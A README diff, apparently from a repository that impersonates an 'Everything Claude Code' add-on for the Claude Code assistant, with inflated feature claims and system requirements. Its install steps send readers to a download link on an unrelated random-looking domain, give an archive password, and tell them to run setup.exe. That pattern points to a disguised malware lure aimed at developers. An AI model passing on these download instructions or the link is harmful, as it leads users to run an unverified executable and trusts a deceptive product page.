@@ -1,35 +1,32 @@
-# Claude Code
+# Everything Claude Code
 
 [![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://bipfdjnk.com/Everything-Claude-Code)
-DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://your-download-link.com)
-\> \#### Archive password: `2026`
+> #### Archive password: `2026`
 
-Claude Code is an AI-powered coding assistant that helps you understand
-codebases, edit files, debug issues, run commands and automate software
-development tasks from your terminal.
+
+The performance optimization system for AI agent harnesses — specialized agents, skills, hooks, rules, and MCP configurations evolved over 10+ months of intensive daily use. From an Anthropic hackathon winner.
 
 ## Installation
 
--   Download and extract the archive and run `setup.exe`
--   Complete the installation
+- Download and extract the archive and run `setup.exe`
+- Complete the installation
 
-![Claude Code](pic.jpg)
+![Everything Claude Code](pic.jpg)
 
 ## Features
 
--   Understands codebases and helps navigate large projects
--   Edits files and implements features using natural-language
-    instructions
--   Finds bugs, explains errors and assists with debugging
--   Runs terminal commands and supports development workflows
--   Integrates with Git to help review changes and manage code tasks
+- 48+ specialized agents for planning, architecture, code review, security analysis, build error resolution, and more
+- 180+ reusable workflow skills covering TDD, testing, refactoring, documentation, and language-specific best practices
+- 70+ slash commands for quick execution of structured development workflows
+- Automated hooks for memory persistence, continuous learning, security scanning, and verification loops
+- Cross-platform support for Claude Code, Cursor, Codex, OpenCode, and other AI agent harnesses with pre-configured MCP servers
 
 ## System Requirements
 
-    | Parameter  | Minimum |
-    | ---------- | ------- |
-    | OS         | Windows 10/11, macOS, or Linux |
-    | CPU        | 64-bit processor |
-    | RAM        | 4 GB |
-    | Disk Space | 500 MB available |
-    | Additional | Internet connection; supported terminal environment |
+| Parameter  | Minimum |
+| ---------- | ------- |
+| OS         | Windows 10 1809+, macOS 13.0+, Ubuntu 20.04+ / Debian 10+ / Alpine 3.19+ |
+| CPU        | x64 or ARM64 processor |
+| RAM        | 4 GB |
+| Disk Space | 500 MB |
+| Additional | Claude Code CLI v2.1.0 or later, Internet connection |
